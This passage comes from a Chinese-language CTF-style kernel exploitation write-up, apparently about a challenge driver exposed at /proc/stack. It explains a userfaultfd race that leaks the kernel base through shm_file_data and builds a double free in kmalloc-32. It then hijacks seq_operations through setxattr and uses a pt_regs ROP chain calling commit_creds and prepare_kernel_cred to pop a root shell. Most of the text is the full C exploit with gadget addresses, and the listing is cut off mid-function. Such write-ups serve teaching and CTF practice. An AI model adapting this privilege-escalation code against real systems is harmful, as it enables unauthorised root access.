<h5 id="1）泄露内核基址：shm-file-data"><a href="#1）泄露内核基址：shm-file-data" class="headerlink" title="1）泄露内核基址：shm_file_data"></a>1）泄露内核基址：shm_file_data</h5><p>在创建节点时先将新的 object 赋给 head 指针，之后再调用 copy_from_user，我们不难想到的是，可以通过 userfaultfd 让分配线程在 copy_from_user 这里卡住，之后我们在 userfaultfd 线程当中再将该 object 释放，这样我们就能够读出 8 字节的“脏数据”，那么在如此之前我们应当分配一个带有可用数据的结构体并释放</p>
<p>由于题目限制了分配的 object 的大小，故我们应当考虑从 kmallc-32 中分配的结构体，这里笔者选用 <code>shm_file_data</code> 这一结构体，其定义如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">shm_file_data</span> &#123;</span><br>    <span class="hljs-type">int</span> id;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ipc_namespace</span> *<span class="hljs-title">ns</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">file</span>;</span><br>    <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_operations_struct</span> *<span class="hljs-title">vm_ops</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure>

<p>其中我们可以读取的 <code>ns</code> 域刚好指向内核 .text 段，由此我们可以泄露出内核基址</p>
<p>我们可以在通过 <code>shmget</code> 系统调用创建共享内存之后通过 <code>shmat</code> 系统调用获得该结构体，通过 <code>shmdt</code> 我们可以释放该结构体</p>
<blockquote>
<p> 在这里有个笔者弄不明白原因的点：我们需要先创建 userfaultfd 线程后再进行 shm 操作，<strong>否则会失败</strong>，在笔者理解中这操作两个之间的顺序并不关键</p>
</blockquote>
<h5 id="2）构造-double-free"><a href="#2）构造-double-free" class="headerlink" title="2）构造 double free"></a>2）构造 double free</h5><p>构造 double free 的流程比较简单，我们只需要在 pop 时通过 copy_to_user 触发 userfaultfd，在 userfaultfd 线程中再 pop 一次即可</p>
<h5 id="3）userfaultfd-setxattr-劫持-seq-operations-控制内核执行流"><a href="#3）userfaultfd-setxattr-劫持-seq-operations-控制内核执行流" class="headerlink" title="3）userfaultfd + setxattr 劫持 seq_operations 控制内核执行流"></a>3）userfaultfd + setxattr 劫持 seq_operations 控制内核执行流</h5><p>现在在 kmalloc-32 当中的第一个 object 指向自身，那么在接下来的两次分配中我们都将会获得同一个 object，第一次分配时笔者选择分配到 seq_operations 处，接下来我们通过 setxattr 再一次分配到该 object，通过 setxattr 更改 seq_operations 中的指针</p>
<p>由于我们需要劫持其第一个指针，故这里我们不能够让 setxattr 执行到末尾将 object 又释放掉，而应当在 setxattr 中的 copy_from_user 中用 userfaultfd 卡住，在 userfaultfd 线程中触发劫持后指针控制内核执行流</p>
<p>控制内核执行流后笔者选择用常规的 pt_regs 来完成 ROP</p>
<h5 id="4-修复-kmalloc-32-的-freelist-拿到稳定-root-shell"><a href="#4-修复-kmalloc-32-的-freelist-拿到稳定-root-shell" class="headerlink" title="4) 修复 kmalloc-32 的 freelist 拿到稳定 root shell"></a>4) 修复 kmalloc-32 的 freelist 拿到稳定 root shell</h5><p>在我们通过 double free 完成利用之后，<strong>内核空间的 kmalloc-32 的 freelist已经被破坏了</strong>，此时我们若是直接起一个 shell 则会造成 kernel panic，因此我们在返回用户空间之后需要先修复 freelist</p>
<p>修复 freelist 只需要往里面放入一定数量的 object 即可，笔者选择在一开始时先多次打开 <code>/proc/self/stat</code> 分配大量 seq_operations 结构体做备用，之后在 setxattr 线程中将其全部释放，这样我们就能够完美着陆回用户态，安全地起一个稳定的 root shell</p>
<h4 id="③-FINAL-EXPLOIT-5"><a href="#③-FINAL-EXPLOIT-5" class="headerlink" title="③ FINAL EXPLOIT"></a>③ FINAL EXPLOIT</h4><p>最终的 exp 如下：</p>
<blockquote>
<p>kernelpwn.h 见本文开头</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/xattr.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/shm.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;kernelpwn.h&quot;</span></span><br><br><span class="hljs-type">int</span>             dev_fd;<br><span class="hljs-type">size_t</span>          seq_fd;<br><span class="hljs-type">size_t</span>          seq_fd_reserve[<span class="hljs-number">0x100</span>];<br><span class="hljs-type">static</span> <span class="hljs-type">char</span>     *page = <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">size_t</span>   page_size;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<br><span class="hljs-title function_">leak_thread</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffd_msg</span> <span class="hljs-title">msg</span>;</span><br>    <span class="hljs-type">int</span> fault_cnt = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">long</span> uffd;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_copy</span> <span class="hljs-title">uffdio_copy</span>;</span><br>    <span class="hljs-type">ssize_t</span> nread;<br><br>    uffd = (<span class="hljs-type">long</span>) arg;<br><br>    <span class="hljs-keyword">for</span> (;;) <br>    &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">pollfd</span>;</span><br>        <span class="hljs-type">int</span> nready;<br>        pollfd.fd = uffd;<br>        pollfd.events = POLLIN;<br>        nready = poll(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);<br><br>        <span class="hljs-keyword">if</span> (nready == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;poll&quot;</span>);<br><br>        nread = read(uffd, &amp;msg, <span class="hljs-keyword">sizeof</span>(msg));<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;EOF on userfaultfd!\n&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;read&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)<br>            errExit(<span class="hljs-string">&quot;Unexpected event on userfaultfd\n&quot;</span>);<br><br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] push trapped in userfaultfd.&quot;</span>);<br>        pop(&amp;kernel_offset);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] leak ptr: %p\n&quot;</span>, kernel_offset);<br>        kernel_offset -= <span class="hljs-number">0xffffffff81c37bc0</span>;<br>        kernel_base += kernel_offset;<br><br>        uffdio_copy.src = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) page;<br>        uffdio_copy.dst = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) msg.arg.pagefault.address &amp;<br>                                              ~(page_size - <span class="hljs-number">1</span>);<br>        uffdio_copy.len = page_size;<br>        uffdio_copy.mode = <span class="hljs-number">0</span>;<br>        uffdio_copy.copy = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_COPY&quot;</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<br><span class="hljs-title function_">double_free_thread</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffd_msg</span> <span class="hljs-title">msg</span>;</span><br>    <span class="hljs-type">int</span> fault_cnt = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">long</span> uffd;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_copy</span> <span class="hljs-title">uffdio_copy</span>;</span><br>    <span class="hljs-type">ssize_t</span> nread;<br><br>    uffd = (<span class="hljs-type">long</span>) arg;<br><br>    <span class="hljs-keyword">for</span> (;;) <br>    &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">pollfd</span>;</span><br>        <span class="hljs-type">int</span> nready;<br>        pollfd.fd = uffd;<br>        pollfd.events = POLLIN;<br>        nready = poll(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);<br><br>        <span class="hljs-keyword">if</span> (nready == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;poll&quot;</span>);<br><br>        nread = read(uffd, &amp;msg, <span class="hljs-keyword">sizeof</span>(msg));<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;EOF on userfaultfd!\n&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;read&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)<br>            errExit(<span class="hljs-string">&quot;Unexpected event on userfaultfd\n&quot;</span>);<br><br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] pop trapped in userfaultfd.&quot;</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] construct the double free...&quot;</span>);<br>        pop(page);<br><br>        uffdio_copy.src = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) page;<br>        uffdio_copy.dst = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) msg.arg.pagefault.address &amp;<br>                                              ~(page_size - <span class="hljs-number">1</span>);<br>        uffdio_copy.len = page_size;<br>        uffdio_copy.mode = <span class="hljs-number">0</span>;<br>        uffdio_copy.copy = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_COPY&quot;</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">size_t</span>  pop_rdi_ret = <span class="hljs-number">0xffffffff81034505</span>;<br><span class="hljs-type">size_t</span>  xchg_rax_rdi_ret = <span class="hljs-number">0xffffffff81d8df6d</span>;<br><span class="hljs-type">size_t</span>  mov_rdi_rax_pop_rbp_ret = <span class="hljs-number">0xffffffff8121f89a</span>;<br><span class="hljs-type">size_t</span>  swapgs_restore_regs_and_return_to_usermode = <span class="hljs-number">0xffffffff81600a34</span>;<br><span class="hljs-type">long</span>    flag_fd;<br><span class="hljs-type">char</span>    flag_buf[<span class="hljs-number">0x100</span>];<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<br><span class="hljs-title function_">hijack_thread</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffd_msg</span> <span class="hljs-title">msg</span>;</span><br>    <span class="hljs-type">int</span> fault_cnt = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">long</span> uffd;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_copy</span> <span class="hljs-title">uffdio_copy</span>;</span><br>    <span class="hljs-type">ssize_t</span> nread;<br><br>    uffd = (<span class="hljs-type">long</span>) arg;<br><br>    <span class="hljs-keyword">for</span> (;;) <br>    &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">pollfd</span>;</span><br>        <span class="hljs-type">int</span> nready;<br>        pollfd.fd = uffd;<br>        pollfd.events = POLLIN;<br>        nready = poll(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);<br><br>        <span class="hljs-keyword">if</span> (nready == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;poll&quot;</span>);<br><br>        nread = read(uffd, &amp;msg, <span class="hljs-keyword">sizeof</span>(msg));<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;EOF on userfaultfd!\n&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;read&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)<br>            errExit(<span class="hljs-string">&quot;Unexpected event on userfaultfd\n&quot;</span>);<br><br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] setxattr trapped in userfaultfd.&quot;</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] trigger now...&quot;</span>);<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++)<br>            close(seq_fd_reserve[i]);<br><br>        <span class="hljs-comment">// trigger</span><br>        pop_rdi_ret += kernel_offset;<br>        xchg_rax_rdi_ret += kernel_offset;<br>        mov_rdi_rax_pop_rbp_ret += kernel_offset;<br>        prepare_kernel_cred = <span class="hljs-number">0xffffffff81069e00</span> + kernel_offset;<br>        commit_creds = <span class="hljs-number">0xffffffff81069c10</span> + kernel_offset;<br>        swapgs_restore_regs_and_return_to_usermode += kernel_offset + <span class="hljs-number">0x10</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] gadget: %p\n&quot;</span>, swapgs_restore_regs_and_return_to_usermode);<br>        __asm__(<br>            <span class="hljs-string">&quot;mov r15,   0xbeefdead;&quot;</span><br>            <span class="hljs-string">&quot;mov r14,   0x11111111;&quot;</span><br>            <span class="hljs-string">&quot;mov r13,   pop_rdi_ret;&quot;</span><br>            <span class="hljs-string">&quot;mov r12,   0;&quot;</span><br>            <span class="hljs-string">&quot;mov rbp,   prepare_kernel_cred;&quot;</span><br>            <span class="hljs-string">&quot;mov rbx,   mov_rdi_rax_pop_rbp_ret;&quot;</span>    <br>            <span class="hljs-string">&quot;mov r11,   0x66666666;&quot;</span><br>            <span class="hljs-string">&quot;mov r10,   commit_creds;&quot;</span><br>            <span class="hljs-string">&quot;mov r9,    swapgs_restore_regs_and_return_to_usermode;&quot;</span><br>            <span class="hljs-string">&quot;mov r8,    0x99999999;&quot;</span><br>            <span class="hljs-string">&quot;xor rax,   rax;&quot;</span><br>            <span class="hljs-string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span><br>            <span class="hljs-string">&quot;mov rdx,   8;&quot;</span><br>            <span class="hljs-string">&quot;mov rsi,   rsp;&quot;</span><br>            <span class="hljs-string">&quot;mov rdi,   seq_fd;&quot;</span><br>            <span class="hljs-string">&quot;syscall&quot;</span><br>        );<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] back to userland successfully!&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] uid: %d gid: %d\n&quot;</span>, getuid(), getgid());<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] execve root shell now...&quot;</span>);<br>        system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br><br>        uffdio_copy.src = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) page;<br>        uffdio_copy.dst = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) msg.arg.pagefault.address &amp;<br>                                              ~(page_size - <span class="hljs-number">1</span>);<br>        uffdio_copy.len = page_size;<br>        uffdio_copy.mode = <span class="hljs-number">0</span>;<br>        uffdio_copy.copy = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_COPY&quot;</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">push</span><span class="hljs-params">(<span class="hljs-type">char</span> *data)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (ioctl(dev_fd, <span class="hljs-number">0x57AC0001</span>, data) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;push!&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">pop</span><span class="hljs-params">(<span class="hljs-type">char</span> *data)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (ioctl(dev_fd, <span class="hljs-number">0x57AC0002</span>, data) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;pop!&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">size_t</span>      data[<span class="hljs-number">0x10</span>];<br>    <span class="hljs-type">char</span>        *uffd_buf_leak;<br>    <span class="hljs-type">char</span>        *uffd_buf_uaf;<br>    <span class="hljs-type">char</span>        *uffd_buf_hack;<br>    <span class="hljs-type">int</span>         pipe_fd[<span class="hljs-number">2</span>];<br>    <span class="hljs-type">int</span>         shm_id;<br>    <span class="hljs-type">char</span>        *shm_addr;<br><br>    dev_fd = open(<span class="hljs-string">&quot;/proc/stack&quot;</span>, O_RDONLY);<br><br>    page = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>);<br>    page_size = sysconf(_SC_PAGE_SIZE);<br><br>    <span class="hljs-comment">// reserve object to protect freelist</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++)<br>        <span class="hljs-keyword">if</span> ((seq_fd_reserve[i] = open(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>, O_RDONLY)) &lt; <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;seq reserve!&quot;</span>);<br><br>    <span class="hljs-comment">// create uffd thread for leak</span><br>    uffd_buf_leak = (<span class="hljs-type">char</span>*) mmap(<span class="hljs-literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    registerUserFaultFd(uffd_buf_leak, page_size, leak_thread);<br><br>    <span class="hljs-comment">// left dirty data in kmalloc-32</span><br>    shm_id = shmget(<span class="hljs-number">114514</span>, <span class="hljs-number">0x1000</span>, SHM_R | SHM_W | IPC_CREAT);<br>    <span class="hljs-keyword">if</span> (shm_id &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;shmget!&quot;</span>);<br>    shm_addr = shmat(shm_id, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (shm_addr &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;shmat!&quot;</span>);<br>    <span class="hljs-keyword">if</span>(shmdt(shm_addr) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;shmdt!&quot;</span>);<br><br>    <span class="hljs-comment">// leak kernel base    </span><br>    push(uffd_buf_leak);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] kernel offset: %p\n&quot;</span>, kernel_offset);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] kernel base: %p\n&quot;</span>, kernel_base);<br><br>    <span class="hljs-comment">// create uffd thread for double free</span><br>    uffd_buf_uaf = (<span class="hljs-type">char</span>*) mmap(<span class="hljs-literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    registerUserFaultFd(uffd_buf_uaf, page_size, double_free_thread);<br><br>    <span class="hljs-comment">// construct the double free</span><br>    push(<span class="hljs-string">&quot;arttnba3&quot;</span>);<br>    pop(uffd_buf_uaf);<br><br>    <span class="hljs-comment">// create uffd thread for hijack</span><br>    uffd_buf_hack = (<span class="hljs-type">char</span>*) mmap(<span class="hljs-literal">NULL</span>, page_size * <span class="hljs-number">2</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    registerUserFaultFd(uffd_buf_hack + page_size, page_size, hijack_thread);<br>    <span 